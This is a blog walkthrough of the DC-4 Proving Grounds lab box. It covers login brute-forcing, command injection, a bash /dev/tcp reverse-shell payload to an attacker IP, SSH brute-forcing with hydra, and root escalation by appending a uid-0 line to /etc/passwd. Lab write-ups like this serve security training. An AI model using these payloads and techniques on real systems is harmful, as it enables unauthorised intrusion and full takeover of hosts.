---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/dc-4,313/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple port scan to get information about the attack surface.

## port scan
```bash
$ nmap -Pn -p- 192.168.193.195
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 20:16 CEST
Nmap scan report for 192.168.193.195
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
```

The web server shows a standard login panel.

---

# exploitation
## login brute force
> Brute forcing the login page with some often used passwords (e.g. `/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt`) shows that the credentials `admin:happy` are working.
{: .prompt-info }

## command injection
Clicking through the admin interface reveals a feature which allows to list a directory on the server.
```http
POST /command.php HTTP/1.1
Host: 192.168.193.195
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.193.195
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.193.195/command.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l946hgu7t13k47989p6m2lpq52
Connection: close

radio=ls+-l&submit=Run

HTTP/1.1 200 OK
Server: nginx/1.15.10
Date: Wed, 02 Aug 2023 18:22:38 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1038

<html>
...
<pre>total 24
-rw-r--r-- 1 root root 1783 Apr  5  2019 command.php
drwxr-xr-x 2 root root 4096 Mar 24  2019 css
drwxr-xr-x 2 root root 4096 Mar 24  2019 images
-rw-r--r-- 1 root root  506 Apr  6  2019 index.php
-rw-r--r-- 1 root root 1473 Apr  7  2019 login.php
-rw-r--r-- 1 root root  663 Mar 24  2019 logout.php
</pre>
...
```

The input parameter looks juicy. Lets try to change the value of the parameter to `id` to see if we can send arbitrary commands.
```http
POST /command.php HTTP/1.1
Host: 192.168.193.195
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.193.195
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.193.195/command.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l946hgu7t13k47989p6m2lpq52
Connection: close

radio=id&submit=Run

HTTP/1.1 200 OK
Server: nginx/1.15.10
Date: Wed, 02 Aug 2023 18:22:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 780

<html>
...
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
...
```

> It works!
{: .prompt-info }

---

# post exploitation
## reverse shell
Start by creating a listener on the attacker machine
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

Execute reverse shell command
payload: `bash -c 'bash -i >& /dev/tcp/192.168.45.179/80 0>&1'`
```http
POST /command.php HTTP/1.1
Host: 192.168.193.195
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.193.195
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.193.195/command.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l946hgu7t13k47989p6m2lpq52
Connection: close

radio=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.179/80+0>%261'&submit=Run
```

Catch connection from target
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.193.195: inverse host lookup failed: Unknown host
connect to [192.168.45.179] from (UNKNOWN) [192.168.193.195] 45022
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dc-4:/usr/share/nginx/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> We got our reverse shell!
{: .prompt-info }

## get first flag
```bash
www-data@dc-4:/home$ cd charles
cd charles
www-data@dc-4:/home/charles$ ls
ls
www-data@dc-4:/home/charles$ ls -lsah
ls -lsah
total 20K
4.0K drwxr-xr-x 2 charles charles 4.0K Apr  7  2019 .
4.0K drwxr-xr-x 5 root    root    4.0K Apr  7  2019 ..
4.0K -rw-r--r-- 1 charles charles  220 Apr  6  2019 .bash_logout
4.0K -rw-r--r-- 1 charles charles 3.5K Apr  6  2019 .bashrc
4.0K -rw-r--r-- 1 charles charles  675 Apr  6  2019 .profile
www-data@dc-4:/home/charles$ cd ..
cd ..
www-data@dc-4:/home$ cd jim
cd jim
www-data@dc-4:/home/jim$ ls
ls
backups
local.txt
mbox
test.sh
www-data@dc-4:/home/jim$ cat local.txt
cat local.txt
3******************************9
```

## privilege escalation
Looking on the system reveals a file with old passwords of the user `jim`
```bash
www-data@dc-4:/usr/share/nginx/html$ cd /home
cd /home
www-data@dc-4:/home$ cd jim
cd jim
www-data@dc-4:/home/jim$ ls
ls
backups
local.txt
mbox
test.sh
www-data@dc-4:/home/jim$ cd backups
cd backups
www-data@dc-4:/home/jim/backups$ ls -lsah
ls -lsah
total 12K
4.0K drwxr-xr-x 2 jim jim 4.0K Apr  7  2019 .
4.0K drwxr-xr-x 3 jim jim 4.0K Aug  3 06:53 ..
4.0K -rw-r--r-- 1 jim jim 2.0K Apr  7  2019 old-passwords.bak
www-data@dc-4:/home/jim/backups$ head old-passwords.bak
head old-passwords.bak
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
```

After downloading the file from the target by copying it to the web folder of the target server and downloading it with the attacker machine we perform a brute force attack against user `jim` via `ssh`.
```bash
$ hydra -I -V -l jim -P old-passwords.bak 192.168.193.195 ssh            
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-02 22:54:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task
[DATA] attacking ssh://192.168.193.195:22/
[ATTEMPT] target 192.168.193.195 - login "jim" - pass "000000" - 1 of 252 [child 0] (0/0)
[ATTEMPT] target 192.168.193.195 - login "jim" - pass "12345" - 2 of 252 [child 1] (0/0)
...
[22][ssh] host: 192.168.193.195   login: jim   password: jibril04
...
```

> Yes! We found credentials: `jim:jibril04`
{: .prompt-info }

Now we can access the target as user `jim`
```bash
$ ssh jim@192.168.193.195                            
The authenticity of host '192.168.193.195 (192.168.193.195)' can't be established.
ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.193.195' (ED25519) to the list of known hosts.
jim@192.168.193.195's password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
jim@dc-4:~$ id
uid=1002(jim) gid=1002(jim) groups=1002(jim)
```

> Inspecting the login message of `jim` shows that we seem to have some mail.
{: .prompt-info }

```bash
jim@dc-4:/opt$ cd /var/spool/mail
jim@dc-4:/var/spool/mail$ ls
jim
jim@dc-4:/var/spool/mail$ cat jim 
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
        (envelope-from <charles@dc-4>)
        id 1hCjIX-0000kO-Qt
        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```

>  Yeah. We now have `charles` password :-) (`^xHhA&hvim0y`)
{: .prompt-info }

Lets switch to user `charles`
```bash
jim@dc-4:/var/spool/mail$ su charles
Password: 
charles@dc-4:/var/spool/mail$ id
uid=1001(charles) gid=1001(charles) groups=1001(charles)
```

When checking `sudo` privileges we see that we are allowed to execute a command.
```bash
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

Lets check what `/usr/bin/teehee` is.
```bash
charles@dc-4:~$ /usr/bin/teehee --help
Usage: /usr/bin/teehee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.

  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit

MODE determines behavior with write errors on the outputs:
  'warn'         diagnose errors writing to any output
  'warn-nopipe'  diagnose errors writing to any output not a pipe
  'exit'         exit on error writing to any output
  'exit-nopipe'  exit on error writing to any output not a pipe
The default MODE for the -p option is 'warn-nopipe'.
The default operation when --output-error is not specified, is to
exit immediately on error writing to a pipe, and diagnose errors
writing to non pipe outputs.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/tee>
or available locally via: info '(coreutils) tee invocation'
```

> It seems to be `tee`
{: .prompt-info }

Googling privilege escalation with `tee` shows a simple technique, by adding a line to `/etc/passwd`.  
  
We start by generating a hash value for `123`.
```bash
$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

Then we construct the line we will add to the `/etc/passwd` file to create a `root` account.
```bash
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

Now we add this line to `/etc/passwd` using the `tee` binary we identified.
```bash
printf 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\n' | sudo /usr/bin/teehee -a /etc/passwd
```

Lets check if we have a `root` account now by switching to user `new` with the password `123`.
```bash
charles@dc-4:~$ su new
Password: 
root@dc-4:/home/charles# id
uid=0(root) gid=0(root) groups=0(root)
```

> Yes! We are `root`
{: .prompt-info }

## get second flag
```bash
root@dc-4:/home/charles# cd /root
root@dc-4:~# ls -lsah
total 32K
4.0K drwx------  3 root root 4.0K Aug  3 06:53 .
4.0K drwxr-xr-x 21 root root 4.0K Apr  5  2019 ..
4.0K -rw-------  1 root root   14 Aug  3 07:11 .bash_history
4.0K -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4.0K -rw-r--r--  1 root root  976 Apr  6  2019 flag.txt
4.0K drwxr-xr-x  2 root root 4.0K Apr  6  2019 .nano
4.0K -rw-r--r--  1 root root  148 Aug 18  2015 .profile
4.0K -rw-r--r--  1 root root   33 Aug  3 06:53 proof.txt
root@dc-4:~# cat proof.txt
2******************************8
```

Pwned! <@:-)
